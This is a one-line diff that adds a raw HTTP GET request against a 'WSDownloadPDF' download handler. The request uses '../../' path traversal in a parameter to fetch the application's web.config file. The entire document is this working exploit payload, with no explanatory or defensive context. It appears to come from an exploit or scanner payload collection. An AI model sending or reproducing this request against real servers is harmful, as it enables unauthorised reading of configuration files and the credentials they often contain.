@@ -1,0 +1,1 @@
+GET /wxInterface/Case.ashx/WSDownloadPDF?file_type=1&app_no=../../&file=web.config HTTP/1.1
